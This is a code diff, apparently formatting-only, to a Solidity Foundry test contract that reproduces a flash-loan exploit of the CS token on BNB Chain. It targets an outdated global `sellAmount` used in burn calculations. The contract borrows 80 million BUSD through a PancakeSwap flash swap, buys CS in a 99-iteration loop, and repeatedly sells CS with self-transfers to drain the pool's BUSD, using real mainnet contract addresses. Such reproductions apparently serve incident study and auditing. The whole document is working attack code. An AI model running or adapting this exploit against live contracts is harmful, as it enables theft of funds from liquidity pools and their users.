@@ -12,9 +12,6 @@ import "./interface.sol";
 // @Summary
 // Outdated global variable `sellAmount` for calculating `burnAmount`
 
-
-
-
 contract CSExp is Test, IPancakeCallee {
     IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
     IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
@@ -23,53 +20,35 @@ contract CSExp is Test, IPancakeCallee {
     IERC20 CS = IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 28466976);
-        
+        cheats.createSelectFork("bsc", 28_466_976);
     }
 
     function testExp() external {
         emit log_named_decimal_uint("[Start] Attacker BUSD Balance", BUSD.balanceOf(address(this)), 18);
-        pair.swap(
-            80_000_000 ether,
-            0,
-            address(this),
-            bytes("123")
-        );
+        pair.swap(80_000_000 ether, 0, address(this), bytes("123"));
         emit log_named_decimal_uint("[End] Attacker BUSD Balance", BUSD.balanceOf(address(this)), 18);
     }
 
-    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         require(msg.sender == address(pair));
         BUSD.approve(address(router), BUSD.balanceOf(address(this)));
         address[] memory path = new address[](2);
         path[0] = address(BUSD);
         path[1] = address(CS);
-        for (uint i = 0; i < 99; ++i) {
+        for (uint256 i = 0; i < 99; ++i) {
             router.swapTokensForExactTokens(
-                5000 ether,
-                BUSD.balanceOf(address(this)),
-                path,
-                address(this),
-                block.timestamp + 1000
+                5000 ether, BUSD.balanceOf(address(this)), path, address(this), block.timestamp + 1000
             );
         }
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            BUSD.balanceOf(address(this)),
-            1,
-            path,
-            0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5,
-            block.timestamp + 1000
+            BUSD.balanceOf(address(this)), 1, path, 0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5, block.timestamp + 1000
         );
         CS.approve(address(router), CS.balanceOf(address(this)));
         path[0] = address(CS);
         path[1] = address(BUSD);
         while (CS.balanceOf(address(this)) >= 3000 ether) {
             router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                3000 ether,
-                1,
-                path,
-                address(this),
-                block.timestamp + 1000
+                3000 ether, 1, path, address(this), block.timestamp + 1000
             );
             CS.transfer(address(this), 2);
         }
@@ -77,7 +56,4 @@ contract CSExp is Test, IPancakeCallee {
     }
 
     receive() external payable {}
-    
 }
-
-
